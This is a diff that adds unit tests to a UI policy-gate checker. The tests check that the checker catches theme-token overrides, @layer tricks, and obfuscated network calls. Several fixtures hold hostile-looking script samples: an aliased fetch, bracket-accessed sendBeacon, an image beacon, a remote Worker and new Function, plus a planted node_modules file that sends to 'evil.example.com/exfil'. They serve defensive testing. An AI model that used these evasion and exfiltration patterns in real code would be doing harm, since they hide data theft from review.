@@ -600,6 +600,124 @@ class PolicyGateTest(unittest.TestCase):
         self.assertEqual(r.returncode, 1, r.stdout)
         self.assertIn("UI-SELF-CONTAINED", r.stdout)
 
+    def test_a_second_stylesheet_may_not_declare_tokens(self) -> None:
+        """The worst round-2 bypass, and it needed no exotic syntax at all: an
+        ordinary second stylesheet, linked after tokens.css, redeclaring a
+        token with pure var() indirection. No hex and no colour function, so
+        UI-SELF-CONTAINED saw nothing; a different file, so THEME-SYNC and
+        PALETTE never opened it. In the browser the later sheet wins, and ink
+        renders invisible on its own background while every rule says PASS."""
+        fx = self.fixture()
+        fx.write("ui/tokens.css", self.tokens())
+        fx.write("ui/shield/theme-override.css",
+                 ':root[data-theme="dark"] {\n'
+                 "  --mg-ink-faint: var(--mg-ground);\n"
+                 "  --mg-series-1: var(--mg-ground);\n}\n")
+        r = fx.run()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("THEME-SYNC", r.stdout)
+        self.assertIn("theme-override.css", r.stdout)
+
+    def test_a_second_stylesheet_without_tokens_is_fine(self) -> None:
+        """Layout-only stylesheets are normal and must stay allowed."""
+        fx = self.fixture()
+        fx.write("ui/tokens.css", self.tokens())
+        fx.write("ui/shield/layout.css", ".grid { display: grid; gap: 16px; }\n")
+        r = fx.run()
+        self.assertEqual(r.returncode, 0, r.stdout)
+
+    def test_at_layer_in_tokens_is_rejected(self) -> None:
+        """@layer decides winners independently of source order — an unlayered
+        rule beats a layered one wherever each sits. parse_css_tokens resolves
+        duplicates by source order, so with a layer present it measures a
+        value the browser never renders. It must refuse to guess."""
+        css = self.tokens() + (
+            "\n@layer overrides {\n"
+            '  :root[data-theme="dark"] { --mg-ink-faint: #7C8C94; }\n'
+            "}\n")
+        r = self.with_tokens(css)
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("THEME-SYNC", r.stdout)
+        self.assertIn("@layer", r.stdout)
+
+    def test_indirection_that_hides_a_call_site_is_rejected(self) -> None:
+        """Round 2's point: matching `fetch(` is useless if the author can
+        reach the same function under another name. The primitives that make
+        a call site unreadable are the violation, whatever follows them."""
+        for label, body in (
+                ("alias fetch",
+                 '<script>const f = fetch; f("ht" + "tps://evil.example/x");</script>'),
+                ("bracket access on a global",
+                 '<script>const m = navigator["sendBeacon"]; m.call(navigator, u, d);</script>'),
+                ("image beacon",
+                 '<script>const i = new Image(); i.src = "ht" + "tps://evil/x.png";</script>'),
+                ("worker loads remote code",
+                 '<script>new Worker("ht" + "tps://evil.example/w.js");</script>'),
+                ("service worker",
+                 '<script>navigator.serviceWorker.register("/sw.js");</script>'),
+                ("runtime code construction",
+                 '<script>new Function("return " + payload)();</script>')):
+            with self.subTest(technique=label):
+                r = self.page(body)
+                self.assertEqual(r.returncode, 1, r.stdout)
+                self.assertIn("UI-SELF-CONTAINED", r.stdout)
+
+    def test_colour_literal_is_caught_despite_an_unrelated_line_comment(self) -> None:
+        """Pins the // exclusion as line-scoped. Replacing the whole exclusion
+        with a file-wide `if "//" in source: continue` left the entire suite
+        green, because no existing fixture happened to contain a `//` -- while
+        the real ui/shield/index.html contains them throughout. That mutation
+        would have silently disabled colour checking on the one file that
+        matters."""
+        r = self.page("<script>\n"
+                      "  const NS = 'http://www.w3.org/2000/svg'; // a comment\n"
+                      "</script>\n"
+                      "<style>.x { color: #8B9AA0; }</style>\n")
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("colour literal", r.stdout)
+
+    def test_prose_in_a_line_comment_does_not_trip_the_rule(self) -> None:
+        """The other direction, and the trap this project has now hit twice:
+        a note explaining why a CDN reference was removed must not itself be
+        a build failure."""
+        r = self.page("<script>\n"
+                      '  // we used to fetch("https://old-cdn.example/x") here; removed\n'
+                      "  // the accent was #8B9AA0 before it was re-stepped\n"
+                      '  fetch("/v1/overview");\n'
+                      "</script>\n")
+        self.assertEqual(r.returncode, 0, r.stdout)
+
+    def test_a_url_inside_a_string_survives_comment_blanking(self) -> None:
+        """...and blanking line comments must not eat the second half of a
+        string literal, which is what made the naive fix unacceptable."""
+        r = self.page('<script>fetch("https://evil.example.com/x");</script>')
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("evil.example.com", r.stdout)
+
+    def test_a_package_tree_under_ui_is_not_skipped_by_name(self) -> None:
+        """Skipping a directory because of its NAME meant an ordinary
+        <script src="node_modules/evil.js"> was never opened."""
+        fx = self.fixture()
+        fx.write("ui/tokens.css", self.tokens())
+        fx.write("ui/shield/index.html", '<script src="node_modules/evil.js"></script>')
+        fx.write("ui/shield/node_modules/evil.js",
+                 'fetch("https://evil.example.com/exfil");\n')
+        r = fx.run()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("UI-SELF-CONTAINED", r.stdout)
+
+    def test_python_dependency_manifests_are_known_to_the_licence_rule(self) -> None:
+        """Python was the one ecosystem actually in use here and the one the
+        rule could not see."""
+        for name in ("requirements.txt", "pyproject.toml", "Pipfile", "setup.py"):
+            with self.subTest(manifest=name):
+                fx = self.fixture()
+                fx.write(f"tools/{name}", "jsonschema==4.26.0\n")
+                r = fx.run()
+                self.assertEqual(r.returncode, 1, r.stdout)
+                self.assertIn("LICENCE", r.stdout)
+                self.assertIn("no scanner", r.stdout)
+
     def test_svg_assets_are_scanned(self) -> None:
         """An SVG is a document, not an image: it can carry <image href> to a
         remote host, its own <style> and <script>, and raw fill="#…". Leaving
